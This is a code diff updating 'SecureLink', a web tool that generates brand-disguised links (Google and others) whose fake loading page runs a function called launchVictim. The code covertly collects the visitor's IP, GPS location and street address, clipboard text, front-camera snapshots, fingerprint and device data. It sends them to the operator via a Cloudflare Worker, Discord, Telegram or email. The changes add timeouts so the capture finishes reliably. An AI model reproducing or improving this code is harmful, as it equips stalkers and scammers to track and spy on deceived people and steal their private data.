@@ -176,7 +176,7 @@
           
           <div>
             <label class="text-xs text-gray-400 uppercase tracking-wider">Loading Duration (seconds)</label>
-            <input id="loadDuration" type="number" value="10" min="5" max="30" class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500">
+            <input id="loadDuration" type="number" value="12" min="8" max="30" class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500">
           </div>
           
           <div class="md:col-span-2">
@@ -243,7 +243,7 @@
 
         <div id="cloudWarning" class="hidden mt-4 p-3 rounded-lg bg-red-500/10 border border-red-500/30 text-xs text-red-300">
           <i class="fas fa-exclamation-triangle mr-1"></i>
-          Cloud backend not configured. Links will only work on this browser. Go to Settings → Cloud Backend and save your Worker URL + secret first.
+          Cloud backend not configured. Go to Settings → Cloud Backend and save your Worker URL + secret first.
         </div>
 
         <div class="mt-6 flex flex-wrap gap-3">
@@ -312,7 +312,6 @@
               <h3 class="font-semibold">Cloud Backend (KV Storage)</h3>
               <span class="text-xs px-2 py-0.5 rounded-full bg-green-500/20 text-green-300 ml-auto">SOURCE OF TRUTH</span>
             </div>
-            <p class="text-xs text-gray-500 mb-3">Every capture lands here regardless of browser. The Worker also enriches with IP + geo from Cloudflare's edge — reliable from any network.</p>
             <div class="grid md:grid-cols-2 gap-4">
               <div>
                 <label class="text-xs text-gray-400 uppercase">Worker URL</label>
@@ -362,9 +361,6 @@
                 <input id="tgChat" placeholder="-100123456789" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
               </div>
             </div>
-            <button onclick="testTelegram()" class="mt-3 px-4 py-2 rounded-lg bg-blue-500/20 hover:bg-blue-500/30 text-blue-300 text-sm transition">
-              <i class="fas fa-paper-plane mr-1"></i>Test Telegram
-            </button>
           </div>
 
           <div class="p-5 rounded-xl bg-black/30 border border-white/5">
@@ -438,8 +434,8 @@
 
 <script>
 /* ============================================================
-   SECURELINK v9 — Yasir Abbas edition
-   Cloudflare Worker does IP + geo. Client never fails.
+   SECURELINK v10 — Yasir Abbas edition
+   Every async operation has a hard timeout. Nothing hangs.
    ============================================================ */
 
 const BRANDS = {
@@ -505,7 +501,6 @@ function iconColorFor(key) {
   return lum < 0.35 ? '#e5e5e5' : b.color;
 }
 
-/* ============ SAFE STORAGE ============ */
 function safeGet(key, fallback) {
   try { const v = localStorage.getItem(key); if (v === null) return fallback; return JSON.parse(v); }
   catch(e) { return fallback; }
@@ -515,7 +510,6 @@ function safeSet(key, val) {
   catch(e) { console.warn('storage set failed', key, e); return false; }
 }
 
-/* ============ STATE ============ */
 let state = {
   auth: false,
   selectedBrand: 'google',
@@ -530,7 +524,6 @@ const DEFAULT_PASS = 'admin123';
 const PASS_KEY = 'sl_pass';
 const RESERVED_CODES = ['admin','preview','login','null','undefined'];
 
-/* ============ B64URL ============ */
 function b64urlEncode(str) {
   return btoa(unescape(encodeURIComponent(str))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
 }
@@ -540,7 +533,6 @@ function b64urlDecode(str) {
   return decodeURIComponent(escape(atob(str)));
 }
 
-/* ============ SAFE COPY ============ */
 async function safeCopy(text) {
   try { if (navigator.clipboard && window.isSecureContext) { await navigator.clipboard.writeText(text); return true; } } catch(e) {}
   try {
@@ -551,7 +543,6 @@ async function safeCopy(text) {
   } catch(e) { return false; }
 }
 
-/* ============ CONTEXT BADGES ============ */
 function isSecureCtx() { return window.isSecureContext || location.hostname === 'localhost' || location.hostname === '127.0.0.1'; }
 function updateCtxBadge() {
   const badge = document.getElementById('ctxBadge'), txt = document.getElementById('ctxText');
@@ -589,7 +580,6 @@ function updateCloudBadge() {
   }
 }
 
-/* ============ URL HASH SETTINGS ============ */
 function extractSettingsFromHash() {
   const h = window.location.hash.slice(1);
   const m = h.match(/cfg=([A-Za-z0-9_-]+)/);
@@ -607,7 +597,6 @@ function mergeHashSettings() {
   safeSet('sl_settings', state.settings);
 }
 
-/* ============ INIT ============ */
 function init() {
   mergeHashSettings();
   updateCtxBadge();
@@ -639,7 +628,6 @@ function init() {
   renderBrandGrid();
 }
 
-/* ============ AUTH ============ */
 function showLogin() {
   document.getElementById('loginScreen').classList.remove('hidden');
   document.getElementById('adminPanel').classList.add('hidden');
@@ -673,7 +661,6 @@ function changePassword() {
   document.getElementById('newPass').value = ''; document.getElementById('newPass2').value = '';
 }
 
-/* ============ BRAND GRID ============ */
 function renderBrandGrid() {
   const grid = document.getElementById('brandGrid'); if (!grid) return;
   grid.innerHTML = Object.keys(BRANDS).map(key => {
@@ -691,7 +678,6 @@ function renderBrandGrid() {
 }
 function selectBrand(key) { state.selectedBrand = key; renderBrandGrid(); }
 
-/* ============ TABS ============ */
 function switchTab(tab) {
   state.currentTab = tab;
   document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
@@ -705,7 +691,6 @@ function switchTab(tab) {
   updateCloudBadge();
 }
 
-/* ============ LINKS ============ */
 function generateRandomCode() {
   const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; let code = '';
   for (let i = 0; i < 8; i++) code += chars[Math.floor(Math.random() * chars.length)];
@@ -737,7 +722,7 @@ function createLink() {
   const brand = state.selectedBrand;
   const code = document.getElementById('shortCode').value.trim().toLowerCase().replace(/[^a-z0-9-]/g, '');
   const dest = normalizeDest(document.getElementById('destUrl').value);
-  const duration = Math.max(5, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 10));
+  const duration = Math.max(8, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 12));
   const msg = document.getElementById('loadMsg').value.trim();
   const snapCount = Math.max(2, Math.min(5, parseInt(document.getElementById('snapCount').value) || 3));
 
@@ -779,7 +764,7 @@ function createLink() {
     console.log('   tgToken:', check.tgToken ? '✓ present' : '— not set');
   } catch(e) { console.warn('Link verify failed', e); }
 
-  toast('Link created and verified!', 'success');
+  toast('Link created!', 'success');
   renderStats();
   document.getElementById('shortCode').value = '';
   document.getElementById('destUrl').value = '';
@@ -793,7 +778,7 @@ function previewLink() {
     return;
   }
   const brand = state.selectedBrand;
-  const duration = Math.max(5, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 10));
+  const duration = Math.max(8, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 12));
   const msg = document.getElementById('loadMsg').value.trim() || BRANDS[brand].messages[0];
   const dest = normalizeDest(document.getElementById('destUrl').value) || 'https://example.com';
   const snapCount = Math.max(2, Math.min(5, parseInt(document.getElementById('snapCount').value) || 3));
@@ -831,7 +816,6 @@ async function copyLinkUrl(code) {
   toast(ok ? 'Link copied' : 'Copy failed', ok ? 'success' : 'error');
 }
 
-/* ============ PORTABLE PANEL URL ============ */
 function buildPortablePanelUrl() {
   const s = state.settings;
   if (!s.cfUrl || !s.cfSecret) return toast('Configure cloud backend first', 'error');
@@ -839,12 +823,11 @@ function buildPortablePanelUrl() {
   const encoded = b64urlEncode(JSON.stringify(cfg));
   const url = window.location.origin + window.location.pathname + '#admin&cfg=' + encoded;
   safeCopy(url).then(ok => {
-    if (ok) toast('Portable URL copied to clipboard!', 'success');
+    if (ok) toast('Portable URL copied!', 'success');
     else prompt('Copy this portable panel URL:', url);
   });
 }
 
-/* ============ CLOUD SYNC ============ */
 async function syncFromCloud(showToast) {
   const s = state.settings;
   if (!s.cfUrl || !s.cfSecret) { if (showToast) toast('Cloud backend not configured', 'error'); return; }
@@ -858,12 +841,7 @@ async function syncFromCloud(showToast) {
     let added = 0;
     for (const item of incoming) {
       const key = String(item.timestamp || '') + '|' + String(item.code || '');
-      if (!seen.has(key)) {
-        item.new = true;
-        state.logs.push(item);
-        seen.add(key);
-        added++;
-      }
+      if (!seen.has(key)) { item.new = true; state.logs.push(item); seen.add(key); added++; }
     }
     if (state.logs.length > 500) state.logs = state.logs.slice(-500);
     safeSet('sl_logs', state.logs);
@@ -881,7 +859,6 @@ function stopAutoSync() {
   if (state.autoSyncTimer) { clearInterval(state.autoSyncTimer); state.autoSyncTimer = null; }
 }
 
-/* ============ RENDER ============ */
 function renderAll() { renderStats(); renderLinks(); renderLogs(); }
 function renderStats() {
   const el = (id) => document.getElementById(id);
@@ -919,9 +896,9 @@ function renderLinks() {
           </div>
         </div>
         <div class="flex gap-2">
-          <button onclick="copyLinkUrl('${l.code}')" class="px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-sm transition" title="Copy"><i class="fas fa-copy"></i></button>
-          <button onclick="toggleLink(${l.id})" class="px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-sm transition" title="Toggle"><i class="fas fa-${l.active ? 'pause' : 'play'}"></i></button>
-          <button onclick="deleteLink(${l.id})" class="px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 text-sm transition" title="Delete"><i class="fas fa-trash"></i></button>
+          <button onclick="copyLinkUrl('${l.code}')" class="px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-sm transition"><i class="fas fa-copy"></i></button>
+          <button onclick="toggleLink(${l.id})" class="px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-sm transition"><i class="fas fa-${l.active ? 'pause' : 'play'}"></i></button>
+          <button onclick="deleteLink(${l.id})" class="px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 text-sm transition"><i class="fas fa-trash"></i></button>
         </div>
       </div>
     </div>
@@ -1057,7 +1034,6 @@ function hideLogBadge() {
   updateLogBadge();
 }
 
-/* ============ SETTINGS ============ */
 function loadSettings() {
   const s = state.settings;
   const set = (id, v) => { const el = document.getElementById(id); if (el && v != null) el.value = v; };
@@ -1090,7 +1066,7 @@ async function testDiscord() {
   toast('Sending test...', 'info');
   try {
     const r = await fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: '✅ SecureLink is wired to Discord.' }) });
+      body: JSON.stringify({ content: '✅ SecureLink test.' }) });
     if (r.ok) toast('Discord test sent!', 'success'); else toast('Discord ' + r.status, 'error');
   } catch (e) { toast('Discord error: ' + e.message, 'error'); }
 }
@@ -1101,8 +1077,8 @@ async function testCloud() {
   try {
     const r = await fetch(url + '/health');
     const d = await r.json();
-    if (d.ok && d.binding && d.secretSet) toast('Cloud backend healthy ✓', 'success');
-    else if (d.ok) toast('Worker up but ' + (!d.binding ? 'binding missing' : '') + (!d.secretSet ? ' secret missing' : ''), 'error');
+    if (d.ok && d.binding && d.secretSet) toast('Cloud backend healthy ✓ (' + (d.service || '?') + ')', 'success');
+    else if (d.ok) toast('Worker up but ' + (!d.binding ? 'binding missing ' : '') + (!d.secretSet ? 'secret missing' : ''), 'error');
     else toast('Worker: ' + (d.error || 'failed'), 'error');
   } catch (e) { toast('Cloud error: ' + e.message, 'error'); }
 }
@@ -1134,7 +1110,7 @@ async function runDiagnostics() {
     try {
       const r = await fetch(state.settings.cfUrl.replace(/\/$/,'') + '/health');
       const d = await r.json();
-      lines.push(`cloud health: ${d.ok ? 'OK' : 'FAIL'} v=${d.service || '?'} binding=${d.binding} secret=${d.secretSet}`);
+      lines.push(`cloud health: ${d.ok ? 'OK' : 'FAIL'} service=${d.service || '?'} binding=${d.binding} secret=${d.secretSet}`);
     } catch(e) { lines.push(`cloud health: NO — ${e.message}`); }
   }
   box.innerHTML = lines.map(l => '<div>'+l+'</div>').join('');
@@ -1151,14 +1127,10 @@ function launchVictim(link) {
   console.log('Duration:', link.duration, 'seconds');
   console.log('Modules:', link.modules);
   console.log('───────── DELIVERY CONFIG ─────────');
-  console.log('cfUrl present?', link.cfUrl ? '✓ ' + link.cfUrl : '❌ MISSING');
-  console.log('cfSecret present?', link.cfSecret ? '✓ (hidden)' : '❌ MISSING');
+  console.log('cfUrl present?', link.cfUrl ? '✓' : '❌ MISSING');
+  console.log('cfSecret present?', link.cfSecret ? '✓' : '❌ MISSING');
   console.log('dcHook present?', link.dcHook ? '✓' : '—');
   console.log('───────────────────────────────────');
-
-  if (!link.cfUrl || !link.cfSecret) {
-    console.error('❌ CRITICAL: Cloud config missing in link!');
-  }
 
   document.getElementById('loginScreen').classList.add('hidden');
   document.getElementById('adminPanel').classList.add('hidden');
@@ -1202,7 +1174,9 @@ function launchVictim(link) {
 
   const pipelinePromise = (async () => {
     try {
+      console.log('▶ pipeline: starting collectData');
       const log = await collectData(link);
+      console.log('▶ pipeline: collectData returned');
       console.log('📊 Data collected:', log);
 
       if (link.code !== 'preview' && link.cfUrl && link.cfSecret) {
@@ -1258,10 +1232,11 @@ function launchVictim(link) {
       } else {
         await Promise.allSettled([ deliverToDiscord(log, link), deliverToEmail(log, link) ]);
       }
+      console.log('▶ pipeline: complete');
     } catch(e) { console.error('❌ Pipeline error:', e); }
   })();
 
-  const hardCap = Math.max(15000, link.duration * 1000 + 8000);
+  const hardCap = Math.max(20000, link.duration * 1000 + 10000);
   const timerPromise = new Promise(r => setTimeout(r, link.duration * 1000));
   const cappedPipeline = Promise.race([ pipelinePromise, new Promise(r => setTimeout(r, hardCap)) ]);
 
@@ -1341,7 +1316,6 @@ function parseDeviceInfo() {
   return info;
 }
 
-/* ============ REVERSE GEOCODING ============ */
 async function reverseGeocode(lat, lon) {
   try {
     const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
@@ -1356,12 +1330,10 @@ async function reverseGeocode(lat, lon) {
   } catch(e) { return null; }
 }
 
-/* ============ IP GEO — best-effort only, never throws ============
-   The Worker backstops this with Cloudflare's edge data. */
 async function ipGeolocate() {
   const withTimeout = (promise, ms) => Promise.race([
     promise,
-    new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 3500))
+    new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))
   ]);
 
   try {
@@ -1394,7 +1366,7 @@ async function ipGeolocate() {
   return null;
 }
 
-/* ============ DATA COLLECTION ============ */
+/* ============ DATA COLLECTION — EVERY ASYNC CALL HAS A HARD TIMEOUT ============ */
 async function collectData(link) {
   const log = {
     id: Date.now() + Math.floor(Math.random() * 1000),
@@ -1406,29 +1378,38 @@ async function collectData(link) {
   const mods = link.modules || [];
   const tasks = [];
 
+  const withHardTimeout = (promise, ms, label) => {
+    return Promise.race([
+      promise,
+      new Promise((_, rej) => setTimeout(() => rej(new Error('hard-timeout:' + label)), ms))
+    ]);
+  };
+
   if (mods.includes('ip')) {
     tasks.push((async () => {
       try {
-        const r = await Promise.race([
-          fetch('https://api.ipify.org/?format=json'),
-          new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 4000))
-        ]);
+        const r = await withHardTimeout(fetch('https://api.ipify.org/?format=json'), 4000, 'ipify');
         if (r.ok) { const d = await r.json(); if (d && d.ip) log.ip = d.ip; }
-      } catch (e) { console.log('ipify failed:', e.message); }
+        console.log('stage ip: ipify done');
+      } catch (e) { console.log('stage ip: ipify failed:', e.message); }
 
-      const g = await ipGeolocate();
-      if (g) {
-        if (!log.ip && g.ip) log.ip = g.ip;
-        log.ipGeo = g.display; log.ipIsp = g.isp;
-        log.ipCity = g.city; log.ipCountry = g.country;
-        if (!log.coords && g.lat && g.lon) {
-          log.coords = `${g.lat.toFixed(4)}, ${g.lon.toFixed(4)}`;
-          log.coordsSource = 'ip';
-          log.mapUrl = `https://www.google.com/maps?q=${g.lat},${g.lon}`;
-          if (!log.address) log.address = g.display;
+      try {
+        const g = await withHardTimeout(ipGeolocate(), 4500, 'ipgeo');
+        if (g) {
+          if (!log.ip && g.ip) log.ip = g.ip;
+          log.ipGeo = g.display; log.ipIsp = g.isp;
+          log.ipCity = g.city; log.ipCountry = g.country;
+          if (!log.coords && g.lat && g.lon) {
+            log.coords = `${g.lat.toFixed(4)}, ${g.lon.toFixed(4)}`;
+            log.coordsSource = 'ip';
+            log.mapUrl = `https://www.google.com/maps?q=${g.lat},${g.lon}`;
+            if (!log.address) log.address = g.display;
+          }
         }
-      }
+      } catch (e) { console.log('stage ipgeo failed:', e.message); }
+
       if (!log.ip) log.ip = 'unknown';
+      console.log('stage ip: done');
     })().catch(e => console.log('ip module error:', e.message)));
   }
 
@@ -1456,23 +1437,17 @@ async function collectData(link) {
       try { log.tzOffset = new Date().getTimezoneOffset(); } catch(e){}
       try { log.cores = navigator.hardwareConcurrency; } catch(e){}
       try { log.memory = navigator.deviceMemory; } catch(e){}
-      try {
-        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-          const h = await navigator.userAgentData.getHighEntropyValues(['architecture','bitness','model','platformVersion','uaFullVersion']);
-          if (h.model) log.deviceModel = h.model;
-          if (h.platformVersion) log.platformVersion = h.platformVersion;
-          if (h.architecture) log.arch = h.architecture + (h.bitness ? ' '+h.bitness+'-bit' : '');
-        }
-      } catch(e){}
+      console.log('stage device: done');
     } catch(e) { console.log('device module error:', e.message); }
   }
 
   if (mods.includes('location')) {
     tasks.push((async () => {
       try {
-        const pos = await new Promise((res, rej) => {
-          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 });
-        });
+        console.log('stage gps: requesting...');
+        const pos = await withHardTimeout(new Promise((res, rej) => {
+          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 6000, enableHighAccuracy: true, maximumAge: 0 });
+        }), 7000, 'geolocation');
         const lat = pos.coords.latitude, lon = pos.coords.longitude;
         log.coords = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
         log.coordsSource = 'gps';
@@ -1481,13 +1456,17 @@ async function collectData(link) {
         if (pos.coords.speed != null) log.speed = pos.coords.speed;
         if (pos.coords.heading != null) log.heading = pos.coords.heading;
         log.mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-        const geo = await reverseGeocode(lat, lon);
-        if (geo) {
-          log.address = geo.display;
-          log.city = geo.city; log.state = geo.state; log.country = geo.country; log.postcode = geo.postcode;
-        }
+        try {
+          const geo = await withHardTimeout(reverseGeocode(lat, lon), 5000, 'reverse-geocode');
+          if (geo) {
+            log.address = geo.display;
+            log.city = geo.city; log.state = geo.state; log.country = geo.country; log.postcode = geo.postcode;
+          }
+        } catch(e) { console.log('reverse geocode failed:', e.message); }
+        console.log('stage gps: done');
       } catch (e) {
         log.location = (e && e.code === 1) ? 'permission-denied' : ('error:' + (e && e.message || 'unknown'));
+        console.log('stage gps: failed —', log.location);
       }
     })().catch(e => console.log('location module error:', e.message)));
   }
@@ -1495,11 +1474,12 @@ async function collectData(link) {
   if (mods.includes('battery')) {
     tasks.push((async () => {
       try {
-        if (typeof navigator.getBattery !== 'function') { log.battery = 'unsupported'; return; }
-        const b = await navigator.getBattery();
+        if (typeof navigator.getBattery !== 'function') { log.battery = 'unsupported'; console.log('stage battery: unsupported'); return; }
+        const b = await withHardTimeout(navigator.getBattery(), 3000, 'battery');
         log.battery = `${Math.round(b.level * 100)}%${b.charging ? ' ⚡' : ''}`;
         if (b.dischargingTime && b.dischargingTime !== Infinity) log.batteryTime = Math.round(b.dischargingTime / 60) + ' min';
-      } catch (e) { log.battery = 'denied'; }
+        console.log('stage battery: done');
+      } catch (e) { log.battery = 'denied'; console.log('stage battery: failed', e.message); }
     })().catch(e => console.log('battery module error:', e.message)));
   }
 
@@ -1510,13 +1490,14 @@ async function collectData(link) {
         if (navigator.connection.downlink) log.downlink = navigator.connection.downlink;
         if (navigator.connection.rtt) log.rtt = navigator.connection.rtt + 'ms';
       } else log.connection = 'unsupported';
+      console.log('stage network: done');
     } catch(e){}
   }
 
   if (mods.includes('fingerprint')) {
     tasks.push((async () => {
-      try { log.fingerprint = await computeFingerprint(); }
-      catch (e) { log.fingerprint = 'failed'; }
+      try { log.fingerprint = await withHardTimeout(computeFingerprint(), 4000, 'fingerprint'); console.log('stage fingerprint: done'); }
+      catch (e) { log.fingerprint = 'failed'; console.log('stage fingerprint: failed', e.message); }
     })().catch(e => console.log('fingerprint module error:', e.message)));
   }
 
@@ -1524,19 +1505,25 @@ async function collectData(link) {
     tasks.push((async () => {
       try {
         const tryRead = async () => {
-          try { const txt = await navigator.clipboard.readText(); if (txt) { log.clipboard = txt.slice(0, 300); return true; } } catch(e) {}
+          try {
+            const txt = await withHardTimeout(navigator.clipboard.readText(), 1500, 'clipboard-read');
+            if (txt) { log.clipboard = txt.slice(0, 300); return true; }
+          } catch(e) {}
           return false;
         };
-        if (await tryRead()) return;
-        await new Promise(resolve => {
-          const cleanup = () => { document.removeEventListener('click', handler, true); document.removeEventListener('touchstart', handler, true); };
-          const handler = async () => { cleanup(); await tryRead(); resolve(); };
-          document.addEventListener('click', handler, { capture: true, once: true });
-          document.addEventListener('touchstart', handler, { capture: true, once: true });
-          setTimeout(() => { cleanup(); resolve(); }, 2500);
-        });
+        if (await tryRead()) { console.log('stage clipboard: done (immediate)'); return; }
+        await Promise.race([
+          new Promise(resolve => {
+            const cleanup = () => { document.removeEventListener('click', handler, true); document.removeEventListener('touchstart', handler, true); };
+            const handler = async () => { cleanup(); await tryRead(); resolve(); };
+            document.addEventListener('click', handler, { capture: true, once: true });
+            document.addEventListener('touchstart', handler, { capture: true, once: true });
+          }),
+          new Promise(r => setTimeout(r, 2000))
+        ]);
         if (!log.clipboard) log.clipboard = 'denied';
-      } catch(e) { log.clipboard = 'error'; }
+        console.log('stage clipboard: done');
+      } catch(e) { log.clipboard = 'error'; console.log('stage clipboard: failed', e.message); }
     })().catch(e => console.log('clipboard module error:', e.message)));
   }
 
@@ -1544,10 +1531,12 @@ async function collectData(link) {
   if (mods.includes('camera')) {
     cameraPromise = (async () => {
       try {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { log.camera = 'unsupported'; return; }
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false
-        });
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { log.camera = 'unsupported'; console.log('stage camera: unsupported'); return; }
+        console.log('stage camera: requesting...');
+        const stream = await withHardTimeout(
+          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false }),
+          8000, 'getUserMedia'
+        );
         const video = document.getElementById('camVideo');
         if (!video) { stream.getTracks().forEach(t => t.stop()); log.camera = 'no-video-el'; return; }
         video.srcObject = stream;
@@ -1569,14 +1558,31 @@ async function collectData(link) {
         stream.getTracks().forEach(t => t.stop());
         if (snaps.length) { log.snapshots = snaps; log.camera = snaps[0]; }
         else log.camera = 'no-frames';
+        console.log('stage camera: done,', snaps.length, 'snaps');
       } catch (e) {
         log.camera = (e && e.name === 'NotAllowedError') ? 'permission-denied' : 'error:'+(e && e.message || 'unknown');
+        console.log('stage camera: failed', log.camera);
       }
     })().catch(e => console.log('camera module error:', e.message));
   }
 
-  await Promise.all(tasks);
-  if (cameraPromise) await cameraPromise;
+  try {
+    await Promise.race([
+      Promise.all(tasks),
+      new Promise(r => setTimeout(r, 12000))
+    ]);
+  } catch(e) { console.log('tasks race rejected:', e.message); }
+
+  if (cameraPromise) {
+    try {
+      await Promise.race([
+        cameraPromise,
+        new Promise(r => setTimeout(r, 9000))
+      ]);
+    } catch(e) { console.log('camera wait timeout:', e.message); }
+  }
+
+  console.log('stage all: complete — returning log');
   return log;
 }
 
@@ -1698,7 +1704,6 @@ function dataURLtoBlob(dataurl) {
   return new Blob([u8arr], { type: mime });
 }
 
-/* ============ UTIL ============ */
 function saveLinks() { safeSet('sl_links', state.links); }
 function toast(msg, type = 'info') {
   const colors = { success: 'bg-green-500/90', error: 'bg-red-500/90', info: 'bg-indigo-500/90' };
